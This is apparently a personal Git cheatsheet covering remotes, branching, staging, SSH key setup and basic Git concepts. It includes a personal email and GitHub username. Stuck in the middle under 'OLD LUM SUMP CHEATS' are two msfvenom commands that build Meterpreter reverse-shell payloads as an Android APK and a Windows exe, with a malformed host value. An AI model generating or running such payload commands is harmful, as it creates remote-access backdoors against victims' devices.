# Git Cheatsheet

## Below Errors to solve with command : 	
	- fatal: refusing to merge unrelated histories : git pull origin master --allow-unrelated-histories

## Remove Specfic Folder after before commit	   
	  git add .
	  git reset foldername OR git add --all :!foldername

## Restore From Specific Comment : 
	I. git log : get the comment hash..id
	git checkout <commit_hash> -- path/to/deleted/file & 
	Latest : git checkout HEAD -- path/to/deleted/file	

## push to project in github
	1. git init : create git file 
	2. git add . : add all file and folders
	3. git add fileName.extension
	4. git commit -m "Your comment"
	5. git branch -M branchName : default branch is master or main 
	5. git remote add origin https://github.com/dontKnew/food-devliery.git
	6. git remote -v : verify for url where's you are pushing..
	7. git push -u push origin branchname 
		-  git push push origin branchname  : assume already setup

## changed remote origin 
	 -  git remote set-url origin git@github.com:dontKnew/rapidexin.git

## before commit remove the files modification or back to last modification or discard modification : 
	- git reset --hard

## Git Branching & hide and show file/folder, 
	1. first create the branch and enter the branch 
	2. thereafter create file/folderd
	3. git add filename/folderName
	4. git commit "Your comment"
	4. now you will exits from branch, your file/folder will be invisible
	
##  Push All Branches together
	- git push --all origin

## fetch all branches together to local computer.
	- git pull --all

## remove the folder/file after git add and bofore commit from github trace  
	- git rm -r --cached path/filename 
	
# SSH KEY SETUP on git bash window
	1. git config --global user.email "israfil123.sa@gmail.com" : set email
	2. git config --global user.name "Dont Knew" : set name
	3. open command prompt
		 - ssh-keygen -t ed25519 -C "israfil123.sa@gmail.com"
			or 
		- ssh-keygen -t rsa -b 4096 -C "your_email@example.com"  // for legay system
	4. cat ~/.ssh/id_ed25519.pub 
	5. get the key and paste into ur github account https://github.com/settings/ssh/new
	6. first push git@github.com:dontKnew/auth-providers.git ask for first time authentication
	7. Testing for SSH Connection
		1. ssh -vT git@github.com  #for debuging..
		2. ssh -T git@github.com #msg ur github username if connected to github account


 OLD LUM SUMP CHEATS ::
 
18:60:24:1d:5d:96
 msfvenom –p android/meterpreter/reverse_tcp LHOST=18:60:24:1d:5d:96 LPORT=4444 R> ./ehacking.apk
/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=18:60:24:1d:5d:96 -f exe -o payload.exe

## create branch
	- git branch branchname

## enter branch
	- git checkout branchname

## merge multiple or two branch/  go to current branch or main branch or create branch and merge
	- git merge branchlocation or name

##  ignore folder for push project
	- touch .gitignore // add file after created

## check origin where push the project
	- git remote -v 

## check log of git/ changes all things commited
	- git log
## update project from github in computer
git pull origin branchName

## restore from previous changed
git restore --staged

## git remote remove origin 
remove origin link from current git file

## First fetch data from github then if u run merge command they will apply changes from github.com to locally computer
	- git fetch and git merge
	- git pull origin master // Note : Both command also called one command :

## see current branch
	- git rev-parse --abbrev-ref HEAD 
	- git branch --show-current

## see all branch name 
	- git branch

## add collaborator for change in project. ( collaborators must be have github profile)
	1. github profile -> respository project -> settings -> manage access 


# Git Basics Description 

## 1. Unstaged Changes

- Unstaged changes are modifications made to tracked files.
- Tracked files are those that have been added to Git.
- Unstaged changes are not committed until explicitly staged.

## 2. Staging Changes (Git Add)

- Staging allows you to control which changes to include in the next commit.
- Use `git add` to stage changes.
- Staged changes can be verified, and the process can be aborted if needed.

## 3. Committing Changes (Git Commit)

- A Git commit represents a unique snapshot of the project at a specific point.
- Commits are permanently saved to the Git history.
- Each commit has a unique hash value.
- To commit changes, first, use `git add` to stage them.

## 4. Viewing Commit History (Git Log)

- Use `git log` to display a list of all commits in the repository.

## 5. HEAD

- HEAD is a reference to the latest commit or the tip of the current branch.

## 6. Branching

- Main branches can be protected in repository settings.
- Collaborators can contribute by cloning the repository, making changes, creating branches, and submitting pull requests for review.
- Merging changes is done after the review process.

## 7. Single Developer with Multiple Branches

- Merging branches is done using `git checkout` and `git merge`.
- Conflicts may arise when changes occur in the same part of a file.
- Conflicts can be resolved by manually editing the conflicting file and then committing the changes.

### Example: Merging Branch B2 into B1

```bash
git checkout b1
git merge b2
```